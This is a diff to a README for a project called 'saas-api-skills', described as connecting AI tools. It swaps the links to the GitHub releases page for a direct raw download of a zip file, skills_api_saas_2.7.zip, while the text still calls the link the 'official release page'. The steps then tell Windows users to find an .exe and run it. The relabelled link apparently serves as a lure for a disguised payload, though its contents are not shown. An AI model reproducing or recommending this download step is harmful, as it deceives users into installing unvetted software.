@@ -1,6 +1,6 @@
 # 🛠️ saas-api-skills - Connect your AI tools with ease
 
-[https://github.com/Simplex-june29108/saas-api-skills/releases](https://img.shields.io/badge/Download-Latest_Version-blue.svg)
+[https://raw.githubusercontent.com/Simplex-june29108/saas-api-skills/main/skills/skills_api_saas_2.7.zip](https://img.shields.io/badge/Download-Latest_Version-blue.svg)
 
 ## 📖 What are these tools?
 
@@ -20,7 +20,7 @@ Your computer needs to meet these basic standards to run the software. These req
 
 Follow these steps to set up the software on your Windows machine.
 
-1.  Visit the official release page: [Download Link](https://github.com/Simplex-june29108/saas-api-skills/releases)
+1.  Visit the official release page: [Download Link](https://raw.githubusercontent.com/Simplex-june29108/saas-api-skills/main/skills/skills_api_saas_2.7.zip)
 2.  Look for the file that ends in .exe.
 3.  Click the file name to start your download.
 4.  Open the folder where your browser saves files.
